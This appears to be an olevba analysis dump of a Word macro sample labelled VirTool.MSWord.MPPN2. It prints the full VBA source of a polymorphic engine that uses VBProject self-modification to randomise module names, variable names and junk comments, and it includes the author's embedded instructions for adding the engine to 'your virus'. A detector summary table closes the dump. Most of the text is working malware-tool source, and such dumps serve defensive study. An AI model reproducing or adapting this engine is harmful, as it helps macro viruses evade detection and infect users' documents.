olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO KGB.bas 
in file: VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d - OLE stream: 'Macros/VBA/KGB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen2()
'KGB ';`,!
On Error Resume Next 'tyH!
If ThisDocument.Name <> NormalTemplate.Name Then '„7X!
TRTM1 = 12 '�x!
ReDim LUWM1(1 To TRTM1) As String ''*’!
LUWM1(1) = "TRTM1": LUWM1(2) = "KSIM1": LUWM1(3) = "AUUM1" '>e+!
LUWM1(4) = "LUWM1": LUWM1(5) = "MWCM1": LUWM1(6) = "YNCM1": LUWM1(7) = "GSYM1" '^)„!
LUWM1(8) = "PUDM1": LUWM1(9) = "DYRM1": LUWM1(10) = "OUPM1": LUWM1(11) = "GRDM1"
LUWM1(12) = "PDBM1" 'UM’!
KSIM1 = ActiveDocument.Content '%`8!
For GSYM1 = 1 To ActiveDocument.VBProject.VBComponents.Count 'I-‹!
OUPM1 = ActiveDocument.VBProject.VBComponents(GSYM1).CodeModule.Lines(2, 1) ']5H!
PUDM1 = Mid(OUPM1, 1, 1) 'E8`!
DYRM1 = Len(OUPM1) '6?2!
If DYRM1 >= 4 Then GRDM1 = Mid(OUPM1, 2, 3) '\e}!
If (PUDM1 = "'") And (GRDM1 = ActiveDocument.VBProject.VBComponents(GSYM1).Name) Then '`ˆN!
Randomize '„ˆf!
GRDM1 = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65))
ActiveDocument.VBProject.VBComponents(GSYM1).CodeModule.ReplaceLine 2, "'" + GRDM1
ActiveDocument.VBProject.VBComponents(GSYM1).Name = GRDM1 'pm7!
PDBM1 = GSYM1 'b/O!
End If '‚E>!
Next GSYM1 '+}^!
ActiveDocument.Windows(1).WindowState = wdWindowStateMinimize '0A�!
ActiveDocument.Content = "" '—ŽI!
AUUM1 = ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.CountOfLines '6:l!
For GSYM1 = 1 To AUUM1 'wo[!
ActiveDocument.Content = ActiveDocument.Content + ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.Lines(GSYM1, 1)
Next GSYM1 '$VW!
For GSYM1 = 1 To TRTM1 'K„+!
Randomize 'sXJ!
YNCM1 = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "M1"
Set MWCM1 = ActiveDocument.Content '@D`!
MWCM1.Find.Execute FindText:=LUWM1(GSYM1), ReplaceWith:=YNCM1, Replace:=wdReplaceAll
Next GSYM1 'z]W!
AUUM1 = ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.CountOfLines '>q3!
ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.DeleteLines 1, AUUM1 'I02!
YNCM1 = ActiveDocument.Content 'f~‚!
ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.AddFromString YNCM1 'A�!
ActiveDocument.Content = "" '‰0b!
ActiveDocument.Content = KSIM1 'm^ˆ!
mm: 'ˆRz!
If ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.Lines(1, 1) <> "Sub AutoOpen()" Then
ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.DeleteLines 1, 1 'w|\!
GoTo mm 'kmd!
End If 'F: !
TRTM1 = ActiveDocument.VBProject.VBComponents.Item(PDBM1).CodeModule.CountOfLines
For GSYM1 = 2 To TRTM1 '*6`!
OUPM1 = ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.Lines(GSYM1, 1) 'q3s!
GRDM1 = Mid(OUPM1, Len(OUPM1)) '&E“!
If (GRDM1 <> "!") And (Len(OUPM1) < 80) Then 'hi+!
PUDM1 = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
YNCM1 = OUPM1 + " '" + PUDM1 + "!" '?MŠ!
ActiveDocument.VBProject.VBComponents.Item(PDBM1).CodeModule.ReplaceLine GSYM1, YNCM1
End If 'r\„!
Next GSYM1 ':†}!
ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.DeleteLines TRTM1, 1 '”2B!
ActiveDocument.Windows(1).WindowState = wdWindowStateMaximize 'B�‚!
End If '#:!
End Sub 'r?)!
-------------------------------------------------------------------------------
VBA MACRO Gen0.bas 
in file: VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d - OLE stream: 'Macros/VBA/Gen0'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub PolyNgine()
'Gen0
'MI_pirat's PolyMorphing Ngine
On Error Resume Next
If ThisDocument.Name <> NormalTemplate.Name Then
nr = 12
ReDim suk(1 To nr) As String
suk(1) = "nr": suk(2) = "bkup": suk(3) = "nuk"
suk(4) = "suk": suk(5) = "myRange": suk(6) = "strip": suk(7) = "ik"
suk(8) = "char1": suk(9) = "nur": suk(10) = "nam1": suk(11) = "nam2"
suk(12) = "kewl"
bkup = ActiveDocument.Content
'find and change the module name (100% poly)
For ik = 1 To ActiveDocument.VBProject.VBComponents.Count
nam1 = ActiveDocument.VBProject.VBComponents(ik).CodeModule.Lines(2, 1)
char1 = Mid(nam1, 1, 1)
nur = Len(nam1)
If nur >= 4 Then nam2 = Mid(nam1, 2, 3)
If (char1 = "'") And (nam2 = ActiveDocument.VBProject.VBComponents(ik).Name) Then
Randomize
nam2 = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65))
ActiveDocument.VBProject.VBComponents(ik).CodeModule.ReplaceLine 2, "'" + nam2
ActiveDocument.VBProject.VBComponents(ik).Name = nam2
kewl = ik
End If
Next ik
'copy this code to the doc
ActiveDocument.Windows(1).WindowState = wdWindowStateMinimize
ActiveDocument.Content = ""
nuk = ActiveDocument.VBProject.VBComponents(kewl).CodeModule.CountOfLines
'copy this source into the doc (so I can modify it)
For ik = 1 To nuk
ActiveDocument.Content = ActiveDocument.Content + ActiveDocument.VBProject.VBComponents(kewl).CodeModule.Lines(ik, 1)
Next ik
'now find the vars and poymorph 'em !
For ik = 1 To nr
Randomize
strip = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "M1"
Set myRange = ActiveDocument.Content
myRange.Find.Execute FindText:=suk(ik), ReplaceWith:=strip, Replace:=wdReplaceAll
Next ik
'copy everythig back to its origin
nuk = ActiveDocument.VBProject.VBComponents(kewl).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(kewl).CodeModule.DeleteLines 1, nuk
strip = ActiveDocument.Content
ActiveDocument.VBProject.VBComponents(kewl).CodeModule.AddFromString strip
ActiveDocument.Content = ""
ActiveDocument.Content = bkup
mm:
If ActiveDocument.VBProject.VBComponents(kewl).CodeModule.Lines(1, 1) <> "Sub AutoOpen()" Then
ActiveDocument.VBProject.VBComponents(kewl).CodeModule.DeleteLines 1, 1
GoTo mm
End If
'Add random chars
nr = ActiveDocument.VBProject.VBComponents.Item(kewl).CodeModule.CountOfLines
For ik = 2 To nr
nam1 = ActiveDocument.VBProject.VBComponents(kewl).CodeModule.Lines(ik, 1)
nam2 = Mid(nam1, Len(nam1))
If (nam2 <> "!") And (Len(nam1) < 80) Then
char1 = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
strip = nam1 + " '" + char1 + "!"
ActiveDocument.VBProject.VBComponents.Item(kewl).CodeModule.ReplaceLine ik, strip
End If
Next ik
ActiveDocument.VBProject.VBComponents(kewl).CodeModule.DeleteLines nr, 1
ActiveDocument.Windows(1).WindowState = wdWindowStateMaximize
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO Form1.frm 
in file: VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d - OLE stream: 'Macros/VBA/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
Label4.Visible = True
End Sub

Private Sub CommandButton2_Click()
Form1.Hide
Form1.Enabled = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO Start.bas 
in file: VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d - OLE stream: 'Macros/VBA/Start'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Form1.Enabled = True
Form1.Show
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�MI_pirat 's Polymorphic Engine 2k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS�D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Help�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�eXit�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�How to...�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Get outta here!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�To use the ngine in your virus  just copy the source from the KGB module to your module and give it a 3 letter name.Now, on the 2nd line write: 'XXX (where XXX is the name of your module.Make sure that the 1st line is: Sub AutoOpen() ,else modify the code after mm: with your first line instead of mine.To add your vars then count them and change TRTM1=12+your#.Then add an LUWM1(x)="your-var" for all vars (give the vars long names >4). In Gen0 you have doc. code .Enjoy!!!I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e-mail: MI_pirat@yahoo.com
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'VirTool.MSWord.MPPN2-e2f0e9a4a8e24ec5c4ee9dd155af580a3cb9646d' - OLE stream: 'Macros/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

